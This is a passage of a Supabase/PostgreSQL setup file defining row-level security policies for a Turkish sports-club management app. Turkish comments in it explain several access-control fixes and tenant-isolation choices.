  using (private.current_profile_role() = 'yonetici');
create policy "yoklama: antrenör kendi sporcusunu görür" on yoklama for select
  using (exists (select 1 from sporcu_antrenor sa where sa.sporcu_id = yoklama.sporcu_id and sa.antrenor_id = auth.uid()));
create policy "yoklama: veli bağlı sporcusunu görür" on yoklama for select
  using (exists (select 1 from veli_sporcu vs where vs.sporcu_id = yoklama.sporcu_id and vs.veli_id = auth.uid()));
create policy "yoklama: yönetici yazar" on yoklama for insert
  with check (private.current_profile_role() = 'yonetici');
create policy "yoklama: antrenör kendi sporcusu için yazar" on yoklama for insert
  with check (exists (select 1 from sporcu_antrenor sa where sa.sporcu_id = yoklama.sporcu_id and sa.antrenor_id = auth.uid()));
create policy "yoklama: yönetici günceller" on yoklama for update
  using (private.current_profile_role() = 'yonetici') with check (private.current_profile_role() = 'yonetici');
create policy "yoklama: antrenör kendi sporcusunu günceller" on yoklama for update
  using (exists (select 1 from sporcu_antrenor sa where sa.sporcu_id = yoklama.sporcu_id and sa.antrenor_id = auth.uid()))
  with check (exists (select 1 from sporcu_antrenor sa where sa.sporcu_id = yoklama.sporcu_id and sa.antrenor_id = auth.uid()));

-- Veli "İzin Bildir" (0012), 0016'nın grup eşleşmesi kontrolüyle birlikte:
-- `durum is null` sayesinde veli asla katıldı/katılmadı yazamaz veya antrenörün
-- işaretlediği satırı değiştiremez; ek exists ile yalnızca çocuğunun grubunun
-- antrenmanına satır ekleyebilir.
create policy "yoklama: veli kendi sporcusu için izin bildirir (ekler)" on yoklama for insert
  with check (
    durum is null
    and exists (select 1 from veli_sporcu vs where vs.sporcu_id = yoklama.sporcu_id and vs.veli_id = auth.uid())
    and exists (
      select 1 from antrenman a join sporcular s on s.grup_id = a.grup_id
      where a.id = yoklama.antrenman_id and s.id = yoklama.sporcu_id
    )
  );
create policy "yoklama: veli kendi sporcusunun işaretlenmemiş satırını günceller" on yoklama for update
  using (
    durum is null
    and exists (select 1 from veli_sporcu vs where vs.sporcu_id = yoklama.sporcu_id and vs.veli_id = auth.uid())
  )
  with check (
    durum is null
    and exists (select 1 from veli_sporcu vs where vs.sporcu_id = yoklama.sporcu_id and vs.veli_id = auth.uid())
  );

create policy "beceri: giriş yapan herkes okur" on beceri for select using (auth.uid() is not null);
create policy "beceri: yönetici yazar" on beceri for all
  using (private.current_profile_role() = 'yonetici') with check (private.current_profile_role() = 'yonetici');

-- Veli yalnızca gönderilmiş (gonderildi=true) değerlendirmeyi görür — taslak sızmaz.
create policy "gelisim: yönetici tümünü görür" on gelisim_degerlendirme for select
  using (private.current_profile_role() = 'yonetici');
create policy "gelisim: antrenör kendi sporcusunu görür" on gelisim_degerlendirme for select
  using (exists (select 1 from sporcu_antrenor sa where sa.sporcu_id = gelisim_degerlendirme.sporcu_id and sa.antrenor_id = auth.uid()));
create policy "gelisim: veli gönderilmiş olanı görür" on gelisim_degerlendirme for select
  using (gonderildi = true and exists (select 1 from veli_sporcu vs where vs.sporcu_id = gelisim_degerlendirme.sporcu_id and vs.veli_id = auth.uid()));
create policy "gelisim: yönetici yazar" on gelisim_degerlendirme for insert
  with check (private.current_profile_role() = 'yonetici');
create policy "gelisim: antrenör kendi sporcusu için yazar" on gelisim_degerlendirme for insert
  with check (exists (select 1 from sporcu_antrenor sa where sa.sporcu_id = gelisim_degerlendirme.sporcu_id and sa.antrenor_id = auth.uid()));
create policy "gelisim: yönetici günceller" on gelisim_degerlendirme for update
  using (private.current_profile_role() = 'yonetici') with check (private.current_profile_role() = 'yonetici');
create policy "gelisim: antrenör kendi sporcusunu günceller" on gelisim_degerlendirme for update
  using (exists (select 1 from sporcu_antrenor sa where sa.sporcu_id = gelisim_degerlendirme.sporcu_id and sa.antrenor_id = auth.uid()))
  with check (exists (select 1 from sporcu_antrenor sa where sa.sporcu_id = gelisim_degerlendirme.sporcu_id and sa.antrenor_id = auth.uid()));

create policy "gelisim_seviye: degerlendirme üzerinden okur" on gelisim_beceri_seviye for select
  using (exists (
    select 1 from gelisim_degerlendirme gd where gd.id = gelisim_beceri_seviye.degerlendirme_id
    and (
      private.current_profile_role() = 'yonetici'
      or exists (select 1 from sporcu_antrenor sa where sa.sporcu_id = gd.sporcu_id and sa.antrenor_id = auth.uid())
      or (gd.gonderildi = true and exists (select 1 from veli_sporcu vs where vs.sporcu_id = gd.sporcu_id and vs.veli_id = auth.uid()))
    )
  ));
create policy "gelisim_seviye: yönetici ve antrenör yazar" on gelisim_beceri_seviye for all
  using (exists (
    select 1 from gelisim_degerlendirme gd where gd.id = gelisim_beceri_seviye.degerlendirme_id
    and (private.current_profile_role() = 'yonetici' or exists (select 1 from sporcu_antrenor sa where sa.sporcu_id = gd.sporcu_id and sa.antrenor_id = auth.uid()))
  ))
  with check (exists (
    select 1 from gelisim_degerlendirme gd where gd.id = gelisim_beceri_seviye.degerlendirme_id
    and (private.current_profile_role() = 'yonetici' or exists (select 1 from sporcu_antrenor sa where sa.sporcu_id = gd.sporcu_id and sa.antrenor_id = auth.uid()))
  ));


-- ---------------------------------------------------------------------------
-- 12.7 duyuru / etkinlik / maç kadrosu  (0009 + 0016 + 0025)
-- ---------------------------------------------------------------------------
create policy "duyuru: yönetici tümünü görür" on duyuru for select
  using (private.current_profile_role() = 'yonetici');
create policy "duyuru: veli hedefindeyse görür" on duyuru for select
  using (
    auth.uid() is not null
    and (
      tum_veliler = true
      or exists (
        select 1 from duyuru_hedef dh
        join sporcular s on s.grup_id = dh.grup_id
        join veli_sporcu vs on vs.sporcu_id = s.id
        where dh.duyuru_id = duyuru.id and vs.veli_id = auth.uid()
      )
    )
  );
create policy "duyuru: yönetici yazar" on duyuru for insert
  with check (private.current_profile_role() = 'yonetici');

create policy "duyuru_hedef: giriş yapan herkes okur" on duyuru_hedef for select using (auth.uid() is not null);
create policy "duyuru_hedef: yönetici yazar" on duyuru_hedef for insert
  with check (private.current_profile_role() = 'yonetici');

create policy "etkinlik: yönetici tümünü görür" on etkinlik for select
  using (private.current_profile_role() = 'yonetici');
-- 0016: `grup_id is null` dalında auth kontrolü yoktu — girişsiz (yalnızca anon
-- key ile) tüm genel etkinlikler okunabiliyordu. `auth.uid() is not null` şart.
create policy "etkinlik: antrenör kendi grubunu görür" on etkinlik for select
  using (
    auth.uid() is not null
    and (
      grup_id is null
      or exists (
        select 1 from sporcular s join sporcu_antrenor sa on sa.sporcu_id = s.id
        where s.grup_id = etkinlik.grup_id and sa.antrenor_id = auth.uid()
      )
    )
  );
create policy "etkinlik: veli kendi grubunu görür" on etkinlik for select
  using (
    auth.uid() is not null
    and (
      grup_id is null
      or exists (
        select 1 from sporcular s join veli_sporcu vs on vs.sporcu_id = s.id
        where s.grup_id = etkinlik.grup_id and vs.veli_id = auth.uid()
      )
    )
  );
create policy "etkinlik: yönetici yazar" on etkinlik for insert
  with check (private.current_profile_role() = 'yonetici');
create policy "etkinlik: yönetici günceller" on etkinlik for update
  using (private.current_profile_role() = 'yonetici') with check (private.current_profile_role() = 'yonetici');

-- 0025: maç sonucu girişi. RLS SATIR düzeyinde çalışır, KOLON düzeyinde değil —
-- antrenöre etkinlik UPDATE'i verildiği anda aynı satırın tarih/tesis/ucretli/
-- tutar alanlarını da değiştirebilir hâle gelir. Kolon bazlı GRANT de çare değil:
-- yönetici ve antrenör aynı `authenticated` Postgres rolünü paylaşır. Bu yüzden
-- 0003/0016 deseni tekrarlanıyor — politika HANGİ SATIR'ı, protect_etkinlik_sonuc()
-- trigger'ı (bölüm 13.8) HANGİ KOLONLAR'ı belirler. İkisi birlikte anlamlıdır.
--
-- Sahiplik testi "mac_kadro: antrenör kendi grubunu günceller" ile birebir aynı.
-- İKİ BİLİNÇLİ DARALTMA:
--   · `grup_id is not null` — antrenör yukarıdaki SELECT politikasıyla
--     `grup_id is null` (kulüp geneli) etkinlikleri de GÖRÜR; görmek zararsız
--     ama böyle bir etkinliğin sahibi hiçbir antrenör değildir, yazma yöneticide.
--   · `tarih <= current_date` — sonuç ancak oynanmış maça girilir. Aynı gün
--     oynanan maça akşam giriş yapılabilsin diye `<` değil `<=`.
create policy "etkinlik: antrenör kendi grubunun maç sonucunu girer" on etkinlik for update
  using (
    tur = 'mac'
    and grup_id is not null
    and tarih <= current_date
    and exists (
      select 1 from sporcular s join sporcu_antrenor sa on sa.sporcu_id = s.id
      where s.grup_id = etkinlik.grup_id and sa.antrenor_id = auth.uid()
    )
  )
  with check (
    tur = 'mac'
    and grup_id is not null
    and tarih <= current_date
    and exists (
      select 1 from sporcular s join sporcu_antrenor sa on sa.sporcu_id = s.id
      where s.grup_id = etkinlik.grup_id and sa.antrenor_id = auth.uid()
    )
  );

create policy "etkinlik_katilim: yönetici tümünü görür" on etkinlik_katilim for select
  using (private.current_profile_role() = 'yonetici');
create policy "etkinlik_katilim: antrenör kendi sporcusunu görür" on etkinlik_katilim for select
  using (exists (select 1 from sporcu_antrenor sa where sa.sporcu_id = etkinlik_katilim.sporcu_id and sa.antrenor_id = auth.uid()));
create policy "etkinlik_katilim: veli kendi sporcusunu görür" on etkinlik_katilim for select
  using (exists (select 1 from veli_sporcu vs where vs.sporcu_id = etkinlik_katilim.sporcu_id and vs.veli_id = auth.uid()));
create policy "etkinlik_katilim: veli kendi sporcusu için yazar" on etkinlik_katilim for insert
  with check (exists (select 1 from veli_sporcu vs where vs.sporcu_id = etkinlik_katilim.sporcu_id and vs.veli_id = auth.uid()));
create policy "etkinlik_katilim: veli kendi sporcusunu günceller" on etkinlik_katilim for update
  using (exists (select 1 from veli_sporcu vs where vs.sporcu_id = etkinlik_katilim.sporcu_id and vs.veli_id = auth.uid()))
  with check (exists (select 1 from veli_sporcu vs where vs.sporcu_id = etkinlik_katilim.sporcu_id and vs.veli_id = auth.uid()));

create policy "mac_kadro: yönetici tümünü görür" on mac_kadro for select
  using (private.current_profile_role() = 'yonetici');
create policy "mac_kadro: antrenör kendi grubunu görür" on mac_kadro for select
  using (exists (
    select 1 from etkinlik e
    join sporcular s on s.grup_id = e.grup_id
    join sporcu_antrenor sa on sa.sporcu_id = s.id
    where e.id = mac_kadro.etkinlik_id and sa.antrenor_id = auth.uid()
  ));
create policy "mac_kadro: yönetici yazar" on mac_kadro for insert
  with check (private.current_profile_role() = 'yonetici');
create policy "mac_kadro: antrenör kendi grubu için yazar" on mac_kadro for insert
  with check (exists (
    select 1 from etkinlik e
    join sporcular s on s.grup_id = e.grup_id
    join sporcu_antrenor sa on sa.sporcu_id = s.id
    where e.id = mac_kadro.etkinlik_id and sa.antrenor_id = auth.uid()
  ));
create policy "mac_kadro: yönetici günceller" on mac_kadro for update
  using (private.current_profile_role() = 'yonetici') with check (private.current_profile_role() = 'yonetici');
create policy "mac_kadro: antrenör kendi grubunu günceller" on mac_kadro for update
  using (exists (
    select 1 from etkinlik e
    join sporcular s on s.grup_id = e.grup_id
    join sporcu_antrenor sa on sa.sporcu_id = s.id
    where e.id = mac_kadro.etkinlik_id and sa.antrenor_id = auth.uid()
  ))
  with check (exists (
    select 1 from etkinlik e
    join sporcular s on s.grup_id = e.grup_id
    join sporcu_antrenor sa on sa.sporcu_id = s.id
    where e.id = mac_kadro.etkinlik_id and sa.antrenor_id = auth.uid()
  ));

create policy "mac_kadro_sporcu: erişim mac_kadro üzerinden" on mac_kadro_sporcu for select
  using (exists (
    select 1 from mac_kadro mk join etkinlik e on e.id = mk.etkinlik_id
    where mk.id = mac_kadro_sporcu.mac_kadro_id
    and (
      private.current_profile_role() = 'yonetici'
      or exists (
        select 1 from sporcular s join sporcu_antrenor sa on sa.sporcu_id = s.id
        where s.grup_id = e.grup_id and sa.antrenor_id = auth.uid()
      )
    )
  ));
create policy "mac_kadro_sporcu: yönetici ve antrenör yazar" on mac_kadro_sporcu for all
  using (exists (
    select 1 from mac_kadro mk join etkinlik e on e.id = mk.etkinlik_id
    where mk.id = mac_kadro_sporcu.mac_kadro_id
    and (
      private.current_profile_role() = 'yonetici'
      or exists (
        select 1 from sporcular s join sporcu_antrenor sa on sa.sporcu_id = s.id
        where s.grup_id = e.grup_id and sa.antrenor_id = auth.uid()
      )
    )
  ))
  with check (exists (
    select 1 from mac_kadro mk join etkinlik e on e.id = mk.etkinlik_id
    where mk.id = mac_kadro_sporcu.mac_kadro_id
    and (
      private.current_profile_role() = 'yonetici'
      or exists (
        select 1 from sporcular s join sporcu_antrenor sa on sa.sporcu_id = s.id
        where s.grup_id = e.grup_id and sa.antrenor_id = auth.uid()
      )
    )
  ));


-- ---------------------------------------------------------------------------
-- 12.8 konusma / mesaj  (0010)
-- ---------------------------------------------------------------------------
create policy "konusma: veli kendi görür" on konusma for select
  using (veli_id = auth.uid());
create policy "konusma: antrenör kendi görür" on konusma for select
  using (antrenor_id = auth.uid());
create policy "konusma: yönetici tümünü görür" on konusma for select
  using (private.current_profile_role() = 'yonetici');
-- Veli yalnızca gerçekten çocuğunun antrenörü olan biriyle konuşma açabilir.
create policy "konusma: veli gerçek antrenörüyle açar" on konusma for insert
  with check (
    veli_id = auth.uid()
    and exists (
      select 1 from sporcu_antrenor sa join veli_sporcu vs on vs.sporcu_id = sa.sporcu_id
      where sa.antrenor_id = konusma.antrenor_id and vs.veli_id = auth.uid()
    )
  );
-- Taraf değiştirmeyi protect_konusma_taraflar() trigger'ı engeller (bölüm 13.6).
create policy "konusma: veli kendi thread'ini günceller" on konusma for update
  using (veli_id = auth.uid()) with check (veli_id = auth.uid());
create policy "konusma: antrenör kendi thread'ini günceller" on konusma for update
  using (antrenor_id = auth.uid()) with check (antrenor_id = auth.uid());

create policy "mesaj: konusma katılımcısı okur" on mesaj for select
  using (exists (
    select 1 from konusma k where k.id = mesaj.konusma_id
    and (k.veli_id = auth.uid() or k.antrenor_id = auth.uid())
  ));
create policy "mesaj: yönetici tümünü okur" on mesaj for select
  using (private.current_profile_role() = 'yonetici');
create policy "mesaj: katılımcı yazar" on mesaj for insert
  with check (
    gonderen_id = auth.uid()
    and exists (
      select 1 from konusma k where k.id = mesaj.konusma_id
      and (k.veli_id = auth.uid() or k.antrenor_id = auth.uid())
    )
  );


-- ---------------------------------------------------------------------------
-- 12.9 servis / mağaza  (0012)
-- ---------------------------------------------------------------------------
create policy "servis_rota: yönetici tümünü yönetir" on servis_rota for all
  using (private.current_profile_role() = 'yonetici') with check (private.current_profile_role() = 'yonetici');
create policy "servis_rota: veli çocuğunun rotasını görür" on servis_rota for select
  using (exists (
    select 1 from servis_sporcu ss join veli_sporcu vs on vs.sporcu_id = ss.sporcu_id
    where ss.rota_id = servis_rota.id and vs.veli_id = auth.uid()
  ));

create policy "servis_durak: yönetici tümünü yönetir" on servis_durak for all
  using (private.current_profile_role() = 'yonetici') with check (private.current_profile_role() = 'yonetici');
create policy "servis_durak: veli çocuğunun rotasının duraklarını görür" on servis_durak for select
  using (exists (
    select 1 from servis_sporcu ss join veli_sporcu vs on vs.sporcu_id = ss.sporcu_id
    where ss.rota_id = servis_durak.rota_id and vs.veli_id = auth.uid()
  ));

create policy "servis_sporcu: yönetici tümünü yönetir" on servis_sporcu for all
  using (private.current_profile_role() = 'yonetici') with check (private.current_profile_role() = 'yonetici');
create policy "servis_sporcu: veli kendi çocuğunu görür" on servis_sporcu for select
  using (exists (select 1 from veli_sporcu vs where vs.sporcu_id = servis_sporcu.sporcu_id and vs.veli_id = auth.uid()));

create policy "urun: giriş yapan herkes okur" on urun for select using (auth.uid() is not null);
create policy "urun: yönetici yazar" on urun for all
  using (private.current_profile_role() = 'yonetici') with check (private.current_profile_role() = 'yonetici');

create policy "siparis: yönetici tümünü yönetir" on siparis for all
  using (private.current_profile_role() = 'yonetici') with check (private.current_profile_role() = 'yonetici');
create policy "siparis: veli bağlı sporcusunu görür" on siparis for select
  using (exists (select 1 from veli_sporcu vs where vs.sporcu_id = siparis.sporcu_id and vs.veli_id = auth.uid()));
create policy "siparis: veli kendi sporcusu için sipariş açar" on siparis for insert
  with check (exists (select 1 from veli_sporcu vs where vs.sporcu_id = siparis.sporcu_id and vs.veli_id = auth.uid()));

create policy "siparis_kalem: erişim siparis üzerinden okunur" on siparis_kalem for select
  using (exists (
    select 1 from siparis s where s.id = siparis_kalem.siparis_id
    and (
      private.current_profile_role() = 'yonetici'
      or exists (select 1 from veli_sporcu vs where vs.sporcu_id = s.sporcu_id and vs.veli_id = auth.uid())
    )
  ));
create policy "siparis_kalem: yönetici tümünü yönetir" on siparis_kalem for all
  using (private.current_profile_role() = 'yonetici') with check (private.current_profile_role() = 'yonetici');
-- 0036: veli YALNIZCA SATIŞTAKİ ürünü sipariş edebilir.
-- Kulüp bir ürünü listeden kaldırdığında (stok bitti, sezon kapandı) o ürünün
-- yeni siparişi de durmalı; eski bir ekran açık kalmış istemci aksi halde
-- sipariş göndermeye devam ederdi.
-- Bu kural TETİKLEYİCİYE DEĞİL POLİTİKAYA konuldu: RLS yalnızca gerçek
-- kullanıcıya uygulanır, postgres/service_role için baypas edilir — yani seed
-- ve veri taşıma geçmiş siparişleri (ürünü bugün pasif olsa bile) yazabilir.
create policy "siparis_kalem: veli kendi siparişine kalem ekler" on siparis_kalem for insert
  with check (
    exists (
      select 1 from siparis s join veli_sporcu vs on vs.sporcu_id = s.sporcu_id
      where s.id = siparis_kalem.siparis_id and vs.veli_id = auth.uid()
    )
    and exists (select 1 from urun u where u.id = siparis_kalem.urun_id and u.aktif)
  );


-- ---------------------------------------------------------------------------
-- 12.10 bireysel ders / hakediş / başvuru  (0013 + 0016 + 0018)
-- ---------------------------------------------------------------------------
create policy "bireysel_antrenor: giriş yapan herkes okur" on bireysel_antrenor for select
  using (auth.uid() is not null);
create policy "bireysel_antrenor: yönetici yazar" on bireysel_antrenor for insert
  with check (private.current_profile_role() = 'yonetici');
create policy "bireysel_antrenor: yönetici günceller" on bireysel_antrenor for update
  using (private.current_profile_role() = 'yonetici') with check (private.current_profile_role() = 'yonetici');
create policy "bireysel_antrenor: antrenör kendi kaydını günceller" on bireysel_antrenor for update
  using (antrenor_id = auth.uid()) with check (antrenor_id = auth.uid());

create policy "bireysel_musaitlik: giriş yapan herkes okur" on bireysel_musaitlik for select
  using (auth.uid() is not null);
create policy "bireysel_musaitlik: antrenör kendi kaydını yönetir" on bireysel_musaitlik for all
  using (antrenor_id = auth.uid()) with check (antrenor_id = auth.uid());
create policy "bireysel_musaitlik: yönetici tümünü yönetir" on bireysel_musaitlik for all
  using (private.current_profile_role() = 'yonetici') with check (private.current_profile_role() = 'yonetici');

create policy "bireysel_istisna: giriş yapan herkes okur" on bireysel_istisna for select
  using (auth.uid() is not null);
create policy "bireysel_istisna: antrenör kendi kaydını yönetir" on bireysel_istisna for all
  using (antrenor_id = auth.uid()) with check (antrenor_id = auth.uid());
create policy "bireysel_istisna: yönetici tümünü yönetir" on bireysel_istisna for all
  using (private.current_profile_role() = 'yonetici') with check (private.current_profile_role() = 'yonetici');

-- Paket satın alma self-servis değil: INSERT yalnızca yönetici. Veli'nin UPDATE
-- hakkı protect_bireysel_paket() trigger'ı (bölüm 13.5) ile "kalan tam 1 azalır"
-- kuralına kilitlenir.
create policy "bireysel_paket: yönetici tümünü görür" on bireysel_paket for select
  using (private.current_profile_role() = 'yonetici');
create policy "bireysel_paket: antrenör kendi sattığını görür" on bireysel_paket for select
  using (antrenor_id = auth.uid());
create policy "bireysel_paket: veli bağlı sporcusunu görür" on bireysel_paket for select
  using (exists (select 1 from veli_sporcu vs where vs.sporcu_id = bireysel_paket.sporcu_id and vs.veli_id = auth.uid()));
create policy "bireysel_paket: yönetici ekler" on bireysel_paket for insert
  with check (private.current_profile_role() = 'yonetici');
create policy "bireysel_paket: veli kendi sporcusunun paketini günceller" on bireysel_paket for update
  using (exists (select 1 from veli_sporcu vs where vs.sporcu_id = bireysel_paket.sporcu_id and vs.veli_id = auth.uid()))
  with check (exists (select 1 from veli_sporcu vs where vs.sporcu_id = bireysel_paket.sporcu_id and vs.veli_id = auth.uid()));
create policy "bireysel_paket: yönetici günceller" on bireysel_paket for update
  using (private.current_profile_role() = 'yonetici') with check (private.current_profile_role() = 'yonetici');

create policy "bireysel_rezervasyon: yönetici tümünü görür" on bireysel_rezervasyon for select
  using (private.current_profile_role() = 'yonetici');
create policy "bireysel_rezervasyon: antrenör kendi rezervasyonunu görür" on bireysel_rezervasyon for select
  using (antrenor_id = auth.uid());
create policy "bireysel_rezervasyon: veli bağlı sporcusunu görür" on bireysel_rezervasyon for select
  using (exists (select 1 from veli_sporcu vs where vs.sporcu_id = bireysel_rezervasyon.sporcu_id and vs.veli_id = auth.uid()));
-- 0041 — İKİ DEĞİŞİKLİK:
--
--  1) `tarih >= current_date` — GEÇMİŞE REZERVASYON YOK.
--     Kaybın asıl kaynağı buydu: politikada tarih koşulu yoktu, uygulama ekranı
--     da haftanın Pazartesi–Pazar'ını sunup geçmiş günleri elemiyordu. Veli
--     geçmiş bir güne rezervasyon açabiliyor, sonra o rezervasyon reddedilince
--     ya da iptal edilince paket hakkı yanabiliyordu.
--     Bugün serbest (`>=` kullanıldı): aynı gün ders almak meşru bir istek,
--     iade kuralı ayrı katmanda (paket_iade) duruyor.
--
--  2) POLİTİKA ADI "…rezervasyon aç" oldu (eskiden "…açar").
--     Migration zinciri (0013) "…aç" kullanıyordu, kurulum paketi "…açar".
--     İki kaynağın farklı ad taşıması, politikayı drop+create eden bir
--     migration'ın YENİ KURULUMDA eskisini düşürememesine yol açıyordu:
--     `drop policy if exists "…aç"` sessizce hiçbir şey yapmaz, ardından
--     "…aç" adıyla ikinci bir politika oluşurdu. Permissive politikalar
--     OR'landığı için tarih koşulu OLMAYAN eski kural yenisini tamamen
--     etkisiz kılardı. Ad birleştirildi.
create policy "bireysel_rezervasyon: veli kendi sporcusu için rezervasyon aç" on bireysel_rezervasyon for insert
  with check (
    durum = 'onay_bekliyor'
    and tarih >= current_date
    and exists (select 1 from veli_sporcu vs where vs.sporcu_id = bireysel_rezervasyon.sporcu_id and vs.veli_id = auth.uid())
  );
create policy "bireysel_rezervasyon: yönetici ekler" on bireysel_rezervasyon for insert
  with check (private.current_profile_role() = 'yonetici');
-- 0016: WITH CHECK yalnızca sahipliğe bakıyordu; hedef durumlar daraltıldı.
-- Tutar/sporcu/paket dondurmayı protect_bireysel_rezervasyon() trigger'ı yapar.
create policy "bireysel_rezervasyon: antrenör onaylar/reddeder/sonuçlandırır" on bireysel_rezervasyon for update
  using (antrenor_id = auth.uid() and durum in ('onay_bekliyor', 'onaylandi'))
  with check (antrenor_id = auth.uid() and durum in ('onaylandi', 'reddedildi', 'tamamlandi', 'gelmedi'));
-- 0040: `tarih > current_date` — VELİ GEÇMİŞ DERSİ İPTAL EDEMEZ.
-- Tetikleyicideki iade koşulunun ikinci katmanı. İkisi ayrı iş yapıyor:
-- tetikleyici "verilmiş ders iade edilmez" değişmezini herkese uygular,
-- bu politika "geçmişi yeniden yazamazsın" iş kuralını gerçek kullanıcıya.
-- Tek katman yetmezdi: yalnızca tetikleyici olsaydı velinin iptali BAŞARILI
-- olur ama sessizce iade almazdı — kullanıcı hata görmediği için "kayboldu" derdi.
-- ⚠ AYNI GÜN İPTAL ARTIK MÜMKÜN DEĞİL; sömürü tam o aralıkta gerçekleşiyor.
-- Meşru aynı gün iptali antrenör ya da yönetici üzerinden yapılır.
create policy "bireysel_rezervasyon: veli kendi rezervasyonunu iptal eder" on bireysel_rezervasyon for update
  using (
    durum in ('onay_bekliyor', 'onaylandi')
    and tarih > current_date
    and exists (select 1 from veli_sporcu vs where vs.sporcu_id = bireysel_rezervasyon.sporcu_id and vs.veli_id = auth.uid())
  )
  with check (
    durum = 'iptal'
    and tarih > current_date
    and exists (select 1 from veli_sporcu vs where vs.sporcu_id = bireysel_rezervasyon.sporcu_id and vs.veli_id = auth.uid())
  );
create policy "bireysel_rezervasyon: yönetici günceller" on bireysel_rezervasyon for update
  using (private.current_profile_role() = 'yonetici') with check (private.current_profile_role() = 'yonetici');

create policy "antrenor_grup_ucret: yönetici tümünü görür" on antrenor_grup_ucret for select
  using (private.current_profile_role() = 'yonetici');
create policy "antrenor_grup_ucret: antrenör kendi ücretini görür" on antrenor_grup_ucret for select
  using (antrenor_id = auth.uid());
create policy "antrenor_grup_ucret: yönetici yazar" on antrenor_grup_ucret for insert
  with check (private.current_profile_role() = 'yonetici');
create policy "antrenor_grup_ucret: yönetici günceller" on antrenor_grup_ucret for update
  using (private.current_profile_role() = 'yonetici') with check (private.current_profile_role() = 'yonetici');
create policy "antrenor_grup_ucret: yönetici siler" on antrenor_grup_ucret for delete
  using (private.current_profile_role() = 'yonetici');

create policy "hakedis: yönetici tümünü görür" on hakedis for select
  using (private.current_profile_role() = 'yonetici');
create policy "hakedis: antrenör kendi hakedişini görür" on hakedis for select
  using (antrenor_id = auth.uid());
create policy "hakedis: yönetici ekler" on hakedis for insert
  with check (private.current_profile_role() = 'yonetici');
-- Kilit: odendi=true olan satır USING'e takılır, yeniden hesaplama dahil hiçbir
-- güncelleme geçemez.
create policy "hakedis: yönetici günceller (kilitli değilse)" on hakedis for update
  using (private.current_profile_role() = 'yonetici' and odendi = false)
  with check (private.current_profile_role() = 'yonetici');

create policy "hakedis_kalem: erişim hakedis üzerinden okunur" on hakedis_kalem for select
  using (exists (
    select 1 from hakedis h where h.id = hakedis_kalem.hakedis_id
    and (private.current_profile_role() = 'yonetici' or h.antrenor_id = auth.uid())
  ));
create policy "hakedis_kalem: yönetici ekler (ödenmemişse)" on hakedis_kalem for insert
  with check (exists (
    select 1 from hakedis h where h.id = hakedis_kalem.hakedis_id
    and private.current_profile_role() = 'yonetici' and h.odendi = false
  ));
create policy "hakedis_kalem: yönetici siler (ödenmemişse)" on hakedis_kalem for delete
  using (exists (
    select 1 from hakedis h where h.id = hakedis_kalem.hakedis_id
    and private.current_profile_role() = 'yonetici' and h.odendi = false
  ));

-- Başvurular personel içi takip aracı; 0018 ile veli yalnızca KENDİ DENEME
-- başvurusunu ekleyebilir ve kendi başvurularını görebilir.
create policy "basvuru: yönetici tümünü yönetir" on basvuru for all
  using (private.current_profile_role() = 'yonetici') with check (private.current_profile_role() = 'yonetici');
create policy "basvuru: veli kendi başvurusunu ekler" on basvuru for insert
  with check (
    created_by = auth.uid()
    and private.current_profile_role() = 'veli'
    and tag = 'DENEME'
    and durum = 'bekliyor'
    and sporcu_id is null
  );
create policy "basvuru: veli kendi başvurusunu görür" on basvuru for select
  using (created_by = auth.uid());


-- ---------------------------------------------------------------------------
-- 12.11 muhasebe / ayarlar / mobil bayrak / push  (0014 + 0015 + 0019 + 0020)
-- ---------------------------------------------------------------------------
-- Gider ve fatura tamamen dahili: veli/antrenör tarafına hiç açılmıyor.
-- 0015 ile yönetici + muhasebeci.
create policy "gider: yönetici tam yetkili" on gider for all
  using (private.current_profile_role() in ('yonetici', 'muhasebeci'))
  with check (private.current_profile_role() in ('yonetici', 'muhasebeci'));

create policy "fatura: yönetici tam yetkili" on fatura for all
  using (private.current_profile_role() in ('yonetici', 'muhasebeci'))
  with check (private.current_profile_role() in ('yonetici', 'muhasebeci'));

-- INSERT politikası bilinçli olarak YOK: kurum_ayarlari satırı kulüp açılışında
-- 03_kulup_olustur.sql tarafından bir kez eklenir, panelden yalnızca güncellenir.
create policy "kurum_ayarlari: giriş yapan herkes okur" on kurum_ayarlari for select
  using (auth.uid() is not null);
create policy "kurum_ayarlari: yönetici günceller" on kurum_ayarlari for update
  using (private.current_profile_role() = 'yonetici') with check (private.current_profile_role() = 'yonetici');

create policy "mobil_ozellik: giriş yapan herkes okur" on mobil_ozellik for select
  using (auth.uid() is not null);
create policy "mobil_ozellik: yönetici yönetir" on mobil_ozellik for all
  using (private.current_profile_role() = 'yonetici')
  with check (private.current_profile_role() = 'yonetici');

create policy "push_token: kullanıcı kendi token'ını yönetir" on push_token for all
  using (user_id = auth.uid()) with check (user_id = auth.uid());
create policy "push_token: yönetici tümünü okur" on push_token for select
  using (private.current_profile_role() = 'yonetici');
create policy "push_token: yönetici ölü token'ları siler" on push_token for delete
  using (private.current_profile_role() = 'yonetici');


-- ---------------------------------------------------------------------------
-- 12.12 davet  (0022 bölüm 3.2)
-- ---------------------------------------------------------------------------
-- Tek permissive politika bu; veli/antrenör/muhasebeci için davet tablosunda
-- HİÇBİR politika yok, dolayısıyla tablo onlar için tamamen kapalıdır
-- (fail-closed). Muhasebeci bilinçli olarak dışarıda: personel/veli davet etmek
-- finans değil kurum yönetimi işidir.
-- Davet edilen kişi kayıt olurken bu tabloyu OKUMAZ ve OKUYAMAZ — henüz oturumu
-- yoktur; token doğrulaması private.davet_coz ile sunucu tarafında yapılır.
create policy "davet: yönetici kendi kulübünün davetlerini yönetir" on davet for all
  using (private.current_profile_role() = 'yonetici') with check (private.current_profile_role() = 'yonetici');


-- ---------------------------------------------------------------------------
-- 12.13 KİRACI DUVARI — RESTRICTIVE İZOLASYON POLİTİKALARI  (0021 bölüm 9 + 0022 3.1)
-- ---------------------------------------------------------------------------
-- İKİ KRİTİK UYGULAMA DETAYI:
--
-- (A) `TO` YAN TÜMCESİ YAZILMIYOR (yani TO PUBLIC).
--     RESTRICTIVE politikalar YALNIZCA adlandırdıkları rollere uygulanır;
--     `to authenticated` yazılsaydı politika `anon` rolüne HİÇ uygulanmaz, yani
--     anon key ile yapılan bir istekte kiracı duvarı tamamen devre dışı kalırdı.
--     Bugün anon zaten hiçbir permissive politikadan geçemiyor, dolayısıyla
--     TO PUBLIC yazmanın authenticated davranışına etkisi SIFIR; ama ileride
--     birine `for select using (true)` benzeri bir politika eklendiğinde tek fark
--     bu satır olur. Fail-closed tarafta duruyoruz.
--
-- (B) Fonksiyon `(select ...)` ile SARILIYOR.
--     Çıplak `private.current_kulup_id()` her SATIR için yeniden değerlendirilir.
